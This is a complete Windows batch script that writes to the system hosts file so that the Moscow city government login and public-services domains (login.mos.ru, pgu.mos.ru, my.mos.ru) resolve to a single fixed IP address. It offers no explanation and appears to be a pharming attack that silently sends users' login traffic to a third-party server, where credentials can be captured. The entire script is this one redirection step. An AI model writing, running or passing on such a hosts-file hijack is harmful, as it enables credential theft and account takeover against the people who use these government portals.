@echo off
color a
cls
echo. >>"%WINDIR%\System32\drivers\etc\hosts"
echo 212.45.30.108	login.mos.ru pgu.mos.ru my.mos.ru >>"%WINDIR%\System32\drivers\etc\hosts"
echo.
pause
exit